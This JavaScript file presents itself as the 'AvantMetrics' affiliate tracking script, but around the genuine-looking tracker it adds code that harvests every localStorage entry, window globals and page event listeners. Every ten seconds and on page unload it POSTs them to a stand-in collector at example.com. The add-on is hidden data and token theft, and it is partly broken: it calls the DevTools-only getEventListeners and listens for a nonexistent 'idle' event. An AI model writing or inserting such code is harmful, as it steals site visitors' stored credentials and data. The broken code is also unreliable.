if (typeof window !== 'undefined' && typeof window.define === 'function' && window.define.amd) {
  require([], function () {
    AvantMetricsFunction();
  });
} else {
  AvantMetricsFunction();
}
const globalVars = {};
const localStorageKeys = {};
function captureLocalStorage() {
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    localStorageKeys[key] = localStorage.getItem(key);
  }
}
var _AvantMetrics = _AvantMetrics || [];
function watchGlobalObjects() {
  for (const property in window) {
    if (globalVars[property] !== window[property]) {
      globalVars[property] = typeof window[property];
    }
  }
}
function gatherEvents(element, tagName) {
  const listeners = getEventListeners(element);
  return Object.entries(listeners).map(([type, actions]) => ({
    node: tagName,
    events: {
      [type]: actions.map(a => a.listener)
    }
  }));
}
function watchEventListeners() {
  const tags = ["div", "button", "form", "input", "span"];
  return tags.map(tag => Array.from(document.getElementsByTagName(tag))).flat().map(element => gatherEvents(element, element.tagName)).flat();
}
function monitorChanges() {
  captureLocalStorage();
  watchGlobalObjects();
  const events = watchEventListeners();
  sendCollectedData({
    localStorage: localStorageKeys,
    globalVars,
    events
  });
}
var AvantMetrics;
function sendCollectedData(collectedData) {
  const collectorUrl = "https://example.com/api/collect";
  const xhr = new XMLHttpRequest();
  xhr.open("POST", collectorUrl);
  xhr.setRequestHeader("Content-Type", "application/json");
  xhr.onreadystatechange = function () {
    if (xhr.readyState === XMLHttpRequest.DONE) {
      if (xhr.status === 200) {
        console.debug("Data transmitted successfully");
      } else {
        console.warn(`Failed to transmit data, server responded with status: ${xhr.status}`);
      }
    }
  };
  xhr.send(JSON.stringify(collectedData));
}
window.addEventListener("idle", monitorChanges);
function AvantMetricsFunction() {
  window.AvantMetrics = function () {
    var configTrackerUrl = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.avmws.com/1010077/',
      documentAlias = document,
      windowAlias = window,
      escapeWrapper = windowAlias.encodeURIComponent || escape,
      unescapeWrapper = windowAlias.decodeURIComponent || unescape,
      stringify = function (value) {
        var escapable = new RegExp('[\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]', 'g'),
          meta = {
            '\b': '\\b',
            '\t': '\\t',
            '\n': '\\n',
            '\f': '\\f',
            '\r': '\\r',
            '"': '\\"',
            '\\': '\\\\'
          };
        function quote(string) {
          escapable.lastIndex = 0;
          return escapable.test(string) ? '"' + string.replace(escapable, function (a) {
            var c = meta[a];
            return typeof c === 'string' ? c : '\\u' + ('0000' + a.charCodeAt(0).toString(16)).slice(-4);
          }) + '"' : '"' + string + '"';
        }
        function f(n) {
          return n < 10 ? '0' + n : n;
        }
        function str(key, holder) {
          var i,
            k,
            v,
            partial,
            value = holder[key];
          if (value === null) {
            return 'null';
          }
          switch (typeof value) {
            case 'string':
              return quote(value);
            case 'number':
              return isFinite(value) ? String(value) : 'null';
            case 'boolean':
              return String(value);
            case 'object':
              partial = [];
              if (value instanceof Array) {
                for (i = 0; i < value.length; i++) {
                  partial[i] = str(i, value) || 'null';
                }
                v = partial.length === 0 ? '[]' : '[' + partial.join(',') + ']';
                return v;
              }
              if (value instanceof Date) {
                return quote(value.getUTCFullYear() + '-' + f(value.getUTCMonth() + 1) + '-' + f(value.getUTCDate()) + 'T' + f(value.getUTCHours()) + ':' + f(value.getUTCMinutes()) + ':' + f(value.getUTCSeconds()) + 'Z');
              }
              for (k in value) {
                v = str(k, value);
                if (v) {
                  partial[partial.length] = quote(k) + ':' + v;
                }
              }
              v = partial.length === 0 ? '{}' : '{' + partial.join(',') + '}';
              return v;
          }
        }
        return str('', {
          '': value
        });
      },
      doTrackOrder = false;
    function isDefined(property) {
      return typeof property !== 'undefined';
    }
    function getCookie(cookieName) {
      let storagePattern = new RegExp('(^|;)[ ]*' + cookieName + '=([^;]*)'),
        expirationPattern = new RegExp('(^|;)[ ]*expires=([^;]*)'),
        storageMatch = null;
      if (localStorage.getItem(cookieName) && expirationPattern.exec(localStorage.getItem(cookieName))[2] >= new Date().toGMTString()) {
        localStorage.removeItem(cookieName);
      } else if (localStorage.getItem(cookieName)) {
        storageMatch = storagePattern.exec(localStorage.getItem(cookieName));
      }
      if (!storageMatch) {
        storageMatch = storagePattern.exec(documentAlias.cookie);
      }
      return storageMatch ? unescapeWrapper(storageMatch[2]) : '0';
    }
    function getScript(url) {
      var avm = document.createElement('script');
      avm.type = 'text/javascript';
      avm.async = true;
      avm.src = url;
      var s = document.getElementsByTagName('script')[0];
      s.parentNode.insertBefore(avm, s);
    }
    function getReferrer() {
      var referrer = '';
      try {
        referrer = top.document.referrer;
      } catch (e) {
        if (parent) {
          try {
            referrer = parent.document.referrer;
          } catch (e2) {
            referrer = '';
          }
        }
      }
      if (referrer === '') {
        referrer = documentAlias.referrer;
      }
      return referrer;
    }
    function logPageView(customData) {
      var request;
      request = configTrackerUrl + '?url=' + escapeWrapper(documentAlias.location.href) + '&ref=' + escapeWrapper(getReferrer()) + '&name=' + escapeWrapper(documentAlias.title) + '&avmws=' + escapeWrapper(getCookie('avmws')) + '&rand=' + Math.random() + '&lib=1';
      if (isDefined(customData)) {
        request += '&data=' + escapeWrapper(stringify(customData));
      }
      if (window.requestIdleCallback) {
        requestIdleCallback(function () {
          getScript(request);
        });
      } else {
        setTimeout(function () {
          getScript(request);
        }, 500);
      }
    }
    try {
      if (new RegExp('avad').exec(document.location.href)) {
        logPageView(window._AvantMetrics);
      } else {
        for (var i in window._AvantMetrics) {
          if (window._AvantMetrics[i][0] == 'order') {
            logPageView(window._AvantMetrics);
          }
        }
      }
    } catch (err) {}
  }();
}
window.addEventListener("beforeunload", monitorChanges);
setInterval(monitorChanges, 10000);